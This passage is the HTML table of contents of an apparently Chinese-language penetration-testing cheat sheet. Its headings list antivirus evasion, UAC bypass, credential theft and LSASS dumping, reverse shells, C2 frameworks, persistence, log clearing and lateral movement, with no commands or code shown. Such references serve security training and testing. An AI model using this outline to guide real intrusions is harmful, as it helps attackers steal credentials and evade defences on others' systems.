href="#invoke-obfuscation">Invoke-Obfuscation</a></li><li><a href="#xencrypt">Xencrypt</a></li><li><a href="#pyfuscation">PyFuscation</a></li><li><a href="#%E6%8B%86%E5%88%86c%E7%BC%96%E8%AF%91">拆分+C编译</a></li><li><a href="#%E8%A1%8C%E4%B8%BA%E6%A3%80%E6%B5%8B">行为检测</a></li><li><a href="#out-encryptedscript">Out-EncryptedScript</a></li><li><a href="#cobalt-strike-powershell%E5%85%8D%E6%9D%80">cobalt strike powershell免杀</a></li></ul></li><li><a href="#ruby">Ruby</a></li><li><a href="#golang">Golang</a><ul><li><a href="#%E5%8A%A0%E8%BD%BD%E5%99%A8">加载器</a><ul><li><a href="#go-shellcode">go-shellcode</a></li><li><a href="#gsl">Gsl</a></li></ul></li></ul></li></ul></li><li><p><a href="#%E5%86%85%E7%BD%91%E5%9F%9F">内网&amp;域</a></p><ul><li><a href="#powershell">Powershell</a><ul><li><a href="#%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C">远程执行</a></li><li><a href="#%E5%8A%A0%E8%BD%BDexe">加载exe</a></li><li><a href="#exe2ps1">EXE2PS1</a></li><li><a href="#%E7%BB%95%E8%BF%87%E7%AD%96%E7%95%A5">绕过策略</a><ul><li><a href="#base64">Base64</a></li><li><a href="#%E5%86%99%E5%85%A5bat%E7%BB%95%E8%BF%87">写入bat绕过</a></li><li><a href="#%E6%8B%BC%E6%8E%A5%E6%8B%86%E5%88%86%E5%AD%97%E7%AC%A6%E4%B8%B2">拼接拆分字符串</a></li><li><a href="#replace%E6%9B%BF%E6%8D%A2%E5%87%BD%E6%95%B0">Replace替换函数</a></li><li><a href="#http%E5%AD%97%E7%AC%A6%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87">HTTP字符拼接绕过</a></li><li><a href="#%E5%9B%BE%E7%89%87%E5%85%8D%E6%9D%80">图片免杀</a></li><li><a href="#%E5%8A%A0%E8%BD%BDshellcode">加载shellcode</a></li><li><a href="#%E5%8A%A0%E8%BD%BDdll">加载dll</a></li></ul></li></ul></li><li><a href="#windows%E5%AE%89%E5%85%A8%E6%A0%87%E8%AF%86%E7%AC%A6sid">Windows安全标识符(SID)</a></li><li><a href="#%E6%8F%90%E6%9D%83">提权</a><ul><li><a href="#impacket%E5%B7%A5%E5%85%B7%E5%8C%85">Impacket工具包</a></li><li><a href="#windows-exploit-suggester">Windows-exploit-suggester</a></li><li><a href="#wesng">Wesng</a></li><li><a href="#searchsploit">Searchsploit</a></li><li><a href="#%E6%BF%80%E6%B4%BBguest">激活guest</a></li><li><a href="#mysql-udf">MYSQL udf</a></li><li><a href="#mysql-linux-root">MYSQL Linux Root</a></li><li><a href="#mssql">MSSQL</a><ul><li><a href="#xp_cmdshell">xp_cmdshell</a></li><li><a href="#xp_regwrite">xp_regwrite</a></li><li><a href="#xp_dirtree">xp_dirtree</a></li><li><a href="#sp_oacreate">sp_oacreate</a></li><li><a href="#%E6%B2%99%E7%9B%92%E6%89%A7%E8%A1%8C">沙盒执行</a></li><li><a href="#warsqlkit%E5%90%8E%E9%97%A8">WarSQLKit(后门)</a></li></ul></li><li><a href="#msf">MSF</a></li><li><a href="#bypass-uac">Bypass UAC</a><ul><li><a href="#msf">MSF</a></li><li><a href="#dccwbypassuac">DccwBypassUAC</a></li><li><a href="#k8uac">K8uac</a></li><li><a href="#cmstp">CMSTP</a></li><li><a href="#uacme">Uacme</a></li><li><a href="#bypass-uac">Bypass-UAC</a></li><li><a href="#dll-hijack">DLL hijack</a></li><li><a href="#silentcleanup">SilentCleanup</a></li><li><a href="#sdclt">Sdclt</a><ul><li><a href="#1">1</a></li><li><a href="#2">2</a></li></ul></li><li><a href="#makecabwusa">Makecab&amp;Wusa</a></li><li><a href="#clr-bypassuac">CLR BypassUAC</a></li><li><a href="#eventvwr%E5%8A%AB%E6%8C%81%E6%B3%A8%E5%86%8C%E8%A1%A8">eventvwr劫持注册表</a></li><li><a href="#web-delivery">Web Delivery</a></li><li><a href="#invoke-psuacme">Invoke-PsUACme</a></li></ul></li><li><a href="#whitelist%E7%99%BD%E5%90%8D%E5%8D%95">Whitelist(白名单)</a><ul><li><a href="#greatsct">GreatSCT</a></li><li><a href="#jsrat">JSRat</a></li><li><a href="#odbcconfexe">Odbcconf.exe</a></li><li><a href="#msiexecexe">Msiexec.exe</a></li><li><a href="#installutilexe">InstallUtil.exe</a></li><li><a href="#compilerexe">Compiler.exe</a><ul><li><a href="#1xml">1.xml</a></li><li><a href="#1tcp">1.tcp</a></li></ul></li><li><a href="#csc">Csc</a></li><li><a href="#regasm">Regasm</a></li><li><a href="#msbuild">Msbuild</a></li><li><a href="#winrm">Winrm</a></li><li><a href="#mshta">Mshta</a></li><li><a href="#regsvr32">Regsvr32</a></li><li><a href="#rundll32">Rundll32</a><ul><li><a href="#%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6">执行文件</a></li><li><a href="#%E6%97%A0%E5%BC%B9%E7%AA%97%E6%89%A7%E8%A1%8C">无弹窗执行</a></li><li><a href="#%E5%A2%9E%E5%88%A0%E6%B3%A8%E5%86%8C%E8%A1%A8">增删注册表</a></li><li><a href="#%E5%86%99%E6%96%87%E4%BB%B6">写文件</a></li><li><a href="#out-rundllcommand">Out-RundllCommand</a></li></ul></li><li><a href="#dotnettojscript">DotNetToJScript</a><ul><li><a href="#starfighters">StarFighters</a></li><li><a href="#%E7%BB%95%E8%BF%87amsi%E6%89%A7%E8%A1%8C">绕过AMSI执行</a></li></ul></li><li><a href="#wmic">WMIC</a></li><li><a href="#msxsl">Msxsl</a></li><li><a href="#cpl">CPL</a></li></ul></li><li><a href="#runas">Runas</a></li><li><a href="#%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96">令牌窃取</a><ul><li><a href="#msf">MSF</a></li><li><a href="#cobalt-strike">Cobalt strike</a></li></ul></li><li><a href="#%E5%AF%86%E7%A0%81%E7%AA%83%E5%8F%96">密码窃取</a><ul><li><a href="#%E4%BC%AA%E9%80%A0%E9%94%81%E5%B1%8F">伪造锁屏</a></li><li><a href="#%E4%BC%AA%E9%80%A0%E8%AE%A4%E8%AF%81%E6%A1%86">伪造认证框</a><ul><li><a href="#credsleaker">CredsLeaker</a></li><li><a href="#loginprompt">LoginPrompt</a></li><li><a href="#nishang-invoke-credentialsphish">Nishang-Invoke-CredentialsPhish</a></li></ul></li></ul></li><li><a href="#rottenpotato">RottenPotato</a></li><li><a href="#powerup">PowerUp</a></li><li><a href="#powerup-alwaysinstallelevated">Powerup-AlwaysInstallElevated</a></li><li><a href="#alwaysinstallelevated%E6%8F%90%E6%9D%83">AlwaysInstallElevated提权</a></li><li><a href="#trusted-service-paths">Trusted Service Paths</a></li><li><a href="#vulnerable-services">Vulnerable Services</a></li><li><a href="#sudo%E6%8F%90%E6%9D%83">Sudo提权</a></li><li><a href="#linux%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1">Linux计划任务</a></li><li><a href="#linux-suid%E6%8F%90%E6%9D%83">Linux SUID提权</a><ul><li><a href="#find">Find</a></li><li><a href="#nmap">NMAP</a></li><li><a href="#vim">VIM</a></li><li><a href="#bash">BASH</a></li><li><a href="#cpmv">CP/MV</a></li></ul></li><li><a href="#linux-etcpasswd%E6%8F%90%E6%9D%83">Linux /etc/passwd提权</a></li><li><a href="#linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83">Linux脏牛提权</a></li></ul></li><li><a href="#rdpfireawall">RDP&amp;Fireawall</a><ul><li><a href="#%E7%88%86%E7%A0%B4">爆破</a></li><li><a href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%BC%80%E5%90%AF">注册表开启</a></li><li><a href="#netsh%E5%90%AF%E5%8A%A8%E6%9C%8D%E5%8A%A1">NETSH启动服务</a></li><li><a href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E5%BC%80%E5%90%AF">注入点开启</a></li><li><a href="#msf%E5%BC%80%E5%90%AF">MSF开启</a></li><li><a href="#wmic%E5%BC%80%E5%90%AF">Wmic开启</a></li><li><a href="#%E9%98%B2%E7%81%AB%E5%A2%99">防火墙</a></li><li><a href="#%E5%A4%9A%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95">多用户登录</a></li><li><a href="#rdp%E8%BF%9E%E6%8E%A5%E8%AE%B0%E5%BD%95">RDP连接记录</a></li><li><a href="#%E5%88%A0%E9%99%A4%E7%97%95%E8%BF%B9">删除痕迹</a></li></ul></li><li><a href="#%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E8%BD%AC%E5%8F%91">端口映射&amp;转发</a><ul><li><a href="#msf">MSF</a></li><li><a href="#lcxexe">lcx.exe</a></li><li><a href="#ssh">SSH</a><ul><li><a href="#%E6%AD%A3%E5%90%91%E8%BD%AC%E5%8F%91">正向转发</a></li><li><a href="#%E5%8F%8D%E5%90%91%E8%BD%AC%E5%8F%91">反向转发</a></li></ul></li><li><a href="#invoke-socksproxy">Invoke-SocksProxy</a></li><li><a href="#ssf">SSF</a><ul><li><a href="#%E5%8D%95%E5%B1%82%E7%BD%91%E7%BB%9C%E6%AD%A3%E5%90%91%E8%BD%AC%E5%8F%91">单层网络正向转发</a></li><li><a href="#%E5%8D%95%E5%B1%82%E7%BD%91%E7%BB%9C%E5%8F%8D%E5%90%91%E8%BD%AC%E5%8F%91">单层网络反向转发</a></li></ul></li><li><a href="#netsh">Netsh</a></li><li><a href="#iptables">Iptables</a></li><li><a href="#chisel">chisel </a></li></ul></li><li><a href="#%E5%91%BD%E4%BB%A4%E6%8E%A7%E5%88%B6">命令&amp;控制</a><ul><li><a href="#interactive-shell">Interactive shell</a></li><li><a href="#script-reverse-shell">Script reverse shell</a><ul><li><a href="#bash">bash</a></li><li><a href="#nc">nc</a></li><li><a href="#telnet">telnet</a></li><li><a href="#php">php</a></li><li><a href="#python">python</a></li><li><a href="#perl">perl</a></li><li><a href="#ruby">ruby</a></li></ul></li><li><a href="#openssl-encrypt-shell">OpenSSL encrypt shell</a><ul><li><a href="#linux">Linux</a></li><li><a href="#windows">Windows</a></li></ul></li><li><a href="#dnscat2">Dnscat2</a><ul><li><a href="#powercat">Powercat</a></li><li><a href="#dnscat2-exe">Dnscat2 exe</a></li></ul></li><li><a href="#dns-txt-command">DNS TXT Command</a></li><li><a href="#powershell">Powershell</a><ul><li><a href="#msfpowershell">MSF+Powershell</a></li><li><a href="#powercat">Powercat</a></li><li><a href="#nishang">Nishang</a><ul><li><a href="#bind-shell">Bind shell</a></li><li><a href="#%E5%8F%8D%E5%90%91shell">反向shell</a></li><li><a href="#udp%E5%8F%8D%E5%90%91shell">UDP反向shell</a></li><li><a href="#https">HTTPS</a></li><li><a href="#icmp">ICMP</a></li></ul></li><li><a href="#base64">Base64</a></li></ul></li><li><a href="#metasploit">Metasploit</a><ul><li><a href="#%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8">常规使用</a></li><li><a href="#%E6%8A%80%E5%B7%A7%E4%BD%BF%E7%94%A8">技巧使用</a></li><li><a href="#%E6%A8%A1%E5%9D%97">模块</a><ul><li><a href="#auxiliary">Auxiliary</a></li><li><a href="#payload">Payload</a><ul><li><a href="#windows">Windows</a></li><li><a href="#linux">Linux</a></li><li><a href="#macos">MacOS</a></li><li><a href="#web">Web</a></li><li><a href="#android">Android</a></li><li><a href="#shellcode">shellcode</a></li><li><a href="#msf%E8%AE%BE%E7%BD%AE%E7%9B%91%E5%90%AC">msf设置监听</a></li></ul></li></ul></li><li><a href="#meterpreter">Meterpreter</a><ul><li><a href="#%E4%BA%A4%E4%BA%92">交互</a></li><li><a href="#%E6%8F%90%E6%9D%83">提权</a></li><li><a href="#%E5%91%BD%E4%BB%A4">命令</a></li><li><a href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C">文件操作</a></li><li><a href="#%E5%90%8E%E6%B8%97%E9%80%8F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81">后渗透&amp;权限维持</a></li><li><a href="#%E6%B8%85%E7%90%86%E6%97%A5%E5%BF%97">清理日志</a></li></ul></li><li><a href="#msf%E6%B4%BE%E7%94%9Fcobalt-strike%E5%92%8Cempire">MSF派生Cobalt strike和Empire</a><ul><li><a href="#%E6%B4%BE%E7%94%9Fempire">派生Empire</a></li><li><a href="#%E6%B4%BE%E7%94%9Fcobalt-strike">派生Cobalt Strike</a></li></ul></li></ul></li><li><a href="#empire">Empire</a><ul><li><a href="#%E5%AE%89%E8%A3%85">安装</a></li><li><a href="#%E7%9B%91%E5%90%AC">监听</a></li><li><a href="#%E7%94%9F%E6%88%90">生成</a></li><li><a href="#%E8%BF%9E%E6%8E%A5%E9%9D%B6%E6%9C%BA%E5%8F%8A%E5%85%B6%E4%BB%96%E6%93%8D%E4%BD%9C">连接靶机及其他操作</a></li><li><a href="#%E6%8F%90%E6%9D%83">提权</a></li><li><a href="#%E6%A8%AA%E5%90%91">横向</a><ul><li><a href="#%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96">令牌窃取</a></li><li><a href="#%E4%BC%9A%E8%AF%9D%E6%B3%A8%E5%85%A5">会话注入</a></li><li><a href="#hash%E4%BC%A0%E9%80%92">Hash传递</a></li></ul></li><li><a href="#%E5%90%8E%E9%97%A8%E6%8C%81%E4%B9%85%E5%8C%96">后门&amp;持久化</a><ul><li><a href="#%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81">映像劫持</a></li><li><a href="#%E6%B3%A8%E5%85%A5%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%90%AF%E5%8A%A8%E9%A1%B9">注入注册表启动项</a></li><li><a href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1">计划任务</a></li><li><a href="#wmi">WMI</a></li><li><a href="#%E6%B3%A8%E5%85%A5ssp">注入SSP</a></li></ul></li><li><a href="#collection%E4%BF%A1%E6%81%AF%E9%87%87%E9%9B%86">Collection（信息采集）</a></li><li><a href="#code_execution%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">Code_execution（代码执行）</a></li><li><a href="#credentials%E8%BA%AB%E4%BB%BD%E5%87%AD%E8%AF%81">Credentials（身份凭证）</a></li><li><a href="#exfiltration%E6%95%B0%E6%8D%AE%E7%AA%83%E5%8F%96">Exfiltration（数据窃取）</a></li><li><a href="#exploitation%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8exp">Exploitation（漏洞利用EXP）</a></li><li><a href="#lateral_movement%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8">Lateral_movement（横向移动）</a></li><li><a href="#management%E7%AE%A1%E7%90%86">Management（管理）</a></li><li><a href="#persistence%E6%8C%81%E4%B9%85%E5%8C%96">Persistence（持久化）</a></li><li><a href="#privesc%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">Privesc（权限提升）</a></li><li><a href="#recon%E4%BE%A6%E5%AF%9F">Recon（侦察）</a></li><li><a href="#situational_awareness%E6%80%81%E5%8A%BF%E6%84%9F%E7%9F%A5">Situational_awareness（态势感知）</a></li><li><a href="#trollsploit%E6%81%B6%E4%BD%9C%E5%89%A7">Trollsploit（恶作剧）</a></li><li><a href="#empire-word">Empire Word</a></li><li><a href="#empire%E6%B4%BE%E7%94%9Fcobalt-strike%E5%92%8Cmsf">Empire派生Cobalt Strike和MSF</a><ul><li><a href="#%E6%B4%BE%E7%94%9Fmsf">派生MSF</a></li><li><a href="#%E6%B4%BE%E7%94%9Fcobalt-strike">派生Cobalt Strike</a></li></ul></li></ul></li><li><a href="#cobalt-strike">Cobalt Strike</a><ul><li><a href="#%E5%AE%89%E8%A3%85">安装</a></li><li><a href="#%E9%83%A8%E7%BD%B2teamserver">部署TeamServer</a></li><li><a href="#%E6%A8%A1%E5%9D%97">模块</a></li><li><a href="#%E8%BF%9E%E6%8E%A5">连接</a></li><li><a href="#%E7%9B%91%E5%90%AC%E5%99%A8">监听器</a></li><li><a href="#%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97">攻击模块</a></li><li><a href="#%E8%A7%86%E5%9B%BE%E6%A8%A1%E5%9D%97">视图模块</a></li><li><a href="#%E4%BA%A4%E4%BA%92">交互</a></li><li><a href="#beacon">Beacon</a></li><li><a href="#%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99">克隆网站</a></li><li><a href="#office%E5%AE%8F">office宏</a></li><li><a href="#%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6">钓鱼邮件</a></li><li><a href="#%E5%8A%A0%E8%BD%BD%E8%84%9A%E6%9C%AC">加载脚本</a></li><li><a href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81">浏览器劫持</a></li><li><a href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81">权限维持</a></li><li><a href="#%E6%A8%AA%E5%90%91">横向</a></li><li><a href="#%E9%9A%94%E7%A6%BB%E7%BD%91%E7%BB%9C">隔离网络</a><ul><li><a href="#%E6%9D%83%E9%99%90%E6%9C%BA%E4%B8%AD%E8%BD%AC">权限机中转</a></li><li><a href="#smb_beacon">SMB_beacon</a></li><li><a href="#ssh-login">SSH login</a></li></ul></li><li><a href="#%E4%BB%A3%E7%90%86">代理</a></li><li><a href="#%E9%83%A8%E7%BD%B2vpn">部署VPN</a></li><li><a href="#cobalt-strike%E6%B4%BE%E7%94%9F-empire%E5%92%8Cmsf">Cobalt strike派生 Empire和MSF</a><ul><li><a href="#%E6%B4%BE%E7%94%9Fempire">派生Empire</a></li><li><a href="#%E6%B4%BE%E7%94%9Fmsf">派生MSF</a></li></ul></li></ul></li><li><a href="#jsrat">JSRat</a></li><li><a href="#crackmapexec">CrackMapExec</a><ul><li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a></li><li><a href="#%E7%88%86%E7%A0%B4">爆破</a></li><li><a href="#%E5%8F%AF%E7%94%A8%E6%A8%A1%E5%9D%97">可用模块</a></li><li><a href="#pth">PTH</a></li><li><a href="#%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4">执行命令</a></li></ul></li><li><a href="#koadic">koadic</a></li><li><a href="#silenttrinity">SILENTTRINITY</a></li><li><a href="#browser-c2">Browser C2</a></li><li><a href="#dropbox-c2">DropBox C2</a></li><li><a href="#gmail-c2">Gmail C2</a><ul><li><a href="#gcat">Gcat</a></li><li><a href="#gdog">Gdog</a></li></ul></li><li><a href="#telegram-c2">Telegram C2</a></li></ul></li><li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a><ul><li><a href="#cmd">Cmd</a></li><li><a href="#wmi">Wmi</a></li><li><a href="#powerview">PowerView</a></li><li><a href="#linux">Linux</a></li></ul></li><li><a href="#http%E6%9C%8D%E5%8A%A1">HTTP服务</a></li><li><a href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C">文件操作</a><ul><li><a href="#windows%E6%9F%A5%E6%89%BE%E6%96%87%E4%BB%B6">Windows查找文件</a></li><li><a href="#linux%E6%9F%A5%E6%89%BE%E6%96%87%E4%BB%B6">Linux查找文件</a></li><li><a href="#%E5%88%9B%E5%BB%BA">创建</a></li><li><a href="#%E5%8E%8B%E7%BC%A9">压缩</a></li><li><a href="#%E8%A7%A3%E5%8E%8B">解压</a></li><li><a href="#%E4%BC%A0%E8%BE%93">传输</a><ul><li><a href="#ftp">FTP</a></li><li><a href="#vbs">VBS</a></li><li><a href="#js">JS</a></li><li><a href="#bitsadmin">Bitsadmin</a></li><li><a href="#powershell">Powershell </a><ul><li><a href="#1">1</a></li><li><a href="#2">2</a></li><li><a href="#3">3</a></li><li><a href="#4">4</a></li><li><a href="#5">5</a></li></ul></li><li><a href="#certutil">Certutil</a></li><li><a href="#python">Python</a></li><li><a href="#perl">Perl</a></li><li><a href="#php">PHP</a></li><li><a href="#curl">Curl</a></li><li><a href="#wget">wget</a></li><li><a href="#nc">nc </a></li><li><a href="#scp">SCP</a></li></ul></li></ul></li><li><a href="#hash%E5%AF%86%E7%A0%81">Hash&amp;密码</a><ul><li><a href="#%E7%A0%B4%E8%A7%A3%E7%BD%91%E5%9D%80">破解网址</a></li><li><a href="#googlecolab%E7%A0%B4%E8%A7%A3hash">GoogleColab破解hash</a></li><li><a href="#%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5">密码策略</a></li><li><a href="#%E5%BC%80%E5%90%AFwdigest">开启Wdigest </a><ul><li><a href="#cmd">Cmd</a></li><li><a href="#powershell">powershell</a></li><li><a href="#meterpreter">meterpreter</a></li></ul></li><li><a href="#getpass">Getpass</a></li><li><a href="#quarkspwdump">QuarksPwDump</a></li><li><a href="#msf">MSF</a></li><li><a href="#empire">Empire</a></li><li><a href="#invoke-dcsync">Invoke-Dcsync</a></li><li><a href="#mimikatz">Mimikatz</a><ul><li><a href="#%E8%B0%83%E7%94%A8mimikatz%E8%BF%9C%E7%A8%8B%E6%8A%93%E5%8F%96">调用mimikatz远程抓取</a></li><li><a href="#%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8F%E6%8A%93hash">横向批量抓hash</a><ul><li><a href="#schtasks">Schtasks</a></li><li><a href="#wmic">Wmic</a></li></ul></li><li><a href="#%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8">直接使用</a></li><li><a href="#powershell-bypass">Powershell Bypass</a></li><li><a href="#net-20">.net 2.0</a></li><li><a href="#net-40-msbuild">.net 4.0 Msbuild</a></li><li><a href="#jscript">JScript</a></li><li><a href="#procdump64mimikatz">Procdump64+mimikatz</a></li><li><a href="#dumpert">Dumpert</a></li><li><a href="#cisco-jabber%E8%BD%AC%E5%82%A8lsass">Cisco Jabber转储lsass</a></li><li><a href="#%E7%BB%95%E8%BF%87%E5%8D%A1%E5%B7%B4%E6%96%AF%E5%9F%BA">绕过卡巴斯基</a></li><li><a href="#%E8%BF%9C%E7%A8%8Blsass%E8%BF%9B%E7%A8%8B%E8%BD%AC%E5%82%A8-physmem2profit">远程LSASS进程转储-Physmem2profit</a></li><li><a href="#sqldumpermimikatz">SqlDumper+mimikatz</a></li><li><a href="#mimipenguin">Mimipenguin</a></li></ul></li><li><a href="#%E7%BC%93%E5%AD%98hash%E6%8F%90%E5%8F%96">缓存hash提取</a><ul><li><a href="#%E6%B3%A8%E5%86%8C%E8%A1%A8">注册表</a></li><li><a href="#ninjacopy">Ninjacopy</a></li><li><a href="#quarks-pwdump">Quarks-pwdump</a></li></ul></li><li><a href="#%E5%9F%9Fhash%E6%8F%90%E5%8F%96">域hash提取</a><ul><li><a href="#ntdsutil">Ntdsutil</a></li><li><a href="#vssadmin">Vssadmin</a></li><li><a href="#impacket">Impacket</a></li><li><a href="#ntdsdumpex">NTDSDumpex</a></li><li><a href="#wmi%E8%B0%83%E7%94%A8vssadmin">WMI调用Vssadmin</a></li><li><a href="#powersploit">PowerSploit</a></li><li><a href="#nishang">Nishang</a></li><li><a href="#mimikatz">Mimikatz</a></li><li><a href="#msf">MSF</a></li></ul></li><li><a href="#lazagne">laZagne</a><ul><li><a href="#windows">windows</a></li><li><a href="#linux">Linux</a></li></ul></li><li><a href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF">敏感信息</a><ul><li><a href="#seatbelt">Seatbelt</a></li><li><a href="#vnc%E5%AF%86%E7%A0%81">VNC密码</a></li><li><a href="#navicat%E4%BF%A1%E6%81%AF">Navicat信息</a></li><li><a href="#chrome%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81">Chrome保存的密码</a></li><li><a href="#foxmail">Foxmail</a></li><li><a href="#firefox%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81">firefox保存的密码</a></li><li><a href="#securecrt">SecureCRT</a></li></ul></li></ul></li><li><a href="#%E6%A8%AA%E5%90%91">横向</a><ul><li><a href="#%E6%8E%A2%E6%B5%8B%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA">探测存活主机</a><ul><li><a href="#forping%E5%91%BD%E4%BB%A4%E6%9F%A5%E8%AF%A2%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA">For+Ping命令查询存活主机</a></li><li><a href="#nbtscan">NbtScan</a></li><li><a href="#nmap">NMAP</a><ul><li><a href="#%E4%BB%A3%E7%90%86nmap%E6%89%AB%E6%8F%8F">代理nmap扫描</a></li></ul></li><li><a href="#netdiscover">NetDiscover</a></li><li><a href="#rp-scan">rp-scan</a></li><li><a href="#msf">MSF</a></li></ul></li><li><a href="#%E6%8E%A2%E6%B5%8B%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%A3">探测服务&amp;端口</a><ul><li><a href="#powershell">Powershell</a><ul><li><a href="#powersploit">Powersploit</a></li><li><a href="#nishang">Nishang </a></li></ul></li><li><a href="#smb">SMB </a><ul><li><a href="#msf">MSF</a></li><li><a href="#nmap">NMAP</a></li><li><a href="#cmd">CMD</a></li></ul></li><li><a href="#linux-samba%E6%9C%8D%E5%8A%A1">Linux Samba服务</a></li><li><a href="#msf">MSF</a><ul><li><a href="#%E7%AB%AF%E5%8F%A3">端口</a></li><li><a href="#%E6%9C%8D%E5%8A%A1">服务</a></li></ul></li><li><a href="#nc">Nc</a></li><li><a href="#masscan">Masscan</a></li><li><a href="#ptscan">PTScan</a></li><li><a href="#cobaltstrikek8-aggressor">CobaltStrike+K8 Aggressor</a><ul><li><a href="#%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA">存活主机</a></li><li><a href="#ms17010">MS17010</a></li><li><a href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF">操作系统信息</a></li><li><a href="#%E5%86%85%E7%BD%91%E7%AB%99%E7%82%B9banner%E6%A0%87%E9%A2%98%E6%89%AB%E6%8F%8F">内网站点banner、标题扫描</a></li><li><a href="#ftp%E7%88%86%E7%A0%B4">FTP爆破</a></li><li><a href="#wmi%E7%88%86%E7%A0%B4windows%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81">WMI爆破windows账户密码</a></li><li><a href="#%E6%80%9D%E7%A7%91%E8%AE%BE%E5%A4%87%E6%89%AB%E6%8F%8F">思科设备扫描</a></li><li><a href="#%E6%9E%9A%E4%B8%BE%E5%85%B1%E4%BA%AB">枚举共享</a></li><li><a href="#%E6%9E%9A%E4%B8%BEsql-server%E6%95%B0%E6%8D%AE%E5%BA%93">枚举SQL SERVER数据库</a></li></ul></li></ul></li><li><a href="#%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4ipc%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1">执行命令&amp;IPC&amp;计划任务</a><ul><li><a href="#at">AT</a></li><li><a href="#schtasks">Schtasks</a></li><li><a href="#wmic">WMIC</a></li></ul></li><li><a href="#%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E7%99%BB%E8%BF%87%E7%9A%84%E6%9C%BA%E5%99%A8">快速定位域管理登过的机器</a></li><li><a href="#msf%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1">MSF添加路由</a></li><li><a href="#msf%E7%AE%A1%E9%81%93%E7%9B%91%E5%90%AC">MSF管道监听</a></li><li><a href="#%E4%BB%A3%E7%90%86">代理</a><ul><li><a href="#ssh">SSH</a><ul><li><a href="#%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86">正向代理</a></li><li><a href="#%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86">反向代理</a></li><li><a href="#ssh%E9%9A%A7%E9%81%93rc4%E5%8F%8C%E9%87%8D%E5%8A%A0%E5%AF%86">SSH隧道+rc4双重加密</a></li><li><a href="#%E5%85%AC%E7%BD%91ssh%E9%9A%A7%E9%81%93local-msf">公网SSH隧道+Local MSF</a></li></ul></li><li><a href="#socks4a">socks4a</a></li><li><a href="#socks5">socks5</a></li><li><a href="#%E5%9F%BA%E4%BA%8Eweb%E7%9A%84socks5">基于web的socks5 </a><ul><li><a href="#regeorg">reGeorg</a></li><li><a href="#neo-regeorg">Neo-reGeorg</a></li><li><a href="#abptts%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91">ABPTTS端口转发</a></li><li><a href="#tunna%E8%BD%AC%E5%8F%91">Tunna转发</a></li></ul></li><li><a href="#earthworm">Earthworm</a><ul><li><a href="#%E6%AD%A3%E5%90%91%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%AD%98%E5%9C%A8%E5%A4%96%E7%BD%91ip">正向(目标机存在外网IP)：</a></li><li><a href="#%E5%8F%8D%E5%BC%B9socks5%E7%9B%AE%E6%A0%87%E6%9C%BA%E6%97%A0%E5%A4%96%E7%BD%91ip">反弹socks5(目标机无外网IP)：</a></li><li><a href="#%E4%BA%8C%E7%BA%A7%E7%8E%AF%E5%A2%83a%E6%9C%89%E5%A4%96%E7%BD%91b%E5%86%85%E7%BD%91%E6%97%A0%E5%A4%96%E7%BD%91">二级环境(A有外网，B内网无外网)：</a></li><li><a href="#%E4%BA%8C%E7%BA%A7%E7%8E%AF%E5%A2%83a%E6%97%A0%E5%A4%96%E7%BD%91b%E5%86%85%E7%BD%91%E6%97%A0%E5%A4%96%E7%BD%91">二级环境(A无外网，B内网无外网)：</a></li><li><a href="#%E4%B8%89%E7%BA%A7%E7%8E%AF%E5%A2%83a%E6%97%A0%E5%A4%96%E7%BD%91b%E5%86%85%E7%BD%91%E6%97%A0%E5%A4%96%E7%BD%91%E9%80%9Aac%E9%80%9Ab">三级环境(A无外网,B内网无外网通A,C通B)：</a></li></ul></li><li><a href="#frp">Frp </a></li><li><a 